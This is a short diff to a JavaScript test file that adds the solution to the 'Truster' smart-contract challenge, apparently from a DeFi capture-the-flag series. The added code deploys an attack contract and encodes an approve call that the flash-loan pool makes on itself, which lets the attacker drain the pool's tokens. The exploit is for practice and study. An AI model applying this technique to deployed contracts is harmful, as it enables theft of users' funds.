@@ -23,6 +23,13 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackContract = await (await ethers.getContractFactory('TrusterLenderAttack', player)).deploy(token.address, pool.address);
+        const calldata = token.interface.encodeFunctionData("approve", [attackContract.address, TOKENS_IN_POOL]);
+
+        // the pool transfers tokens to itself, the target is the token address and 
+        // data passed is to approve the attack contract to spend its tokens
+        // which the attack contract does in the next step
+        await attackContract.attack(TOKENS_IN_POOL, calldata);
     });
 
     after(async function () {
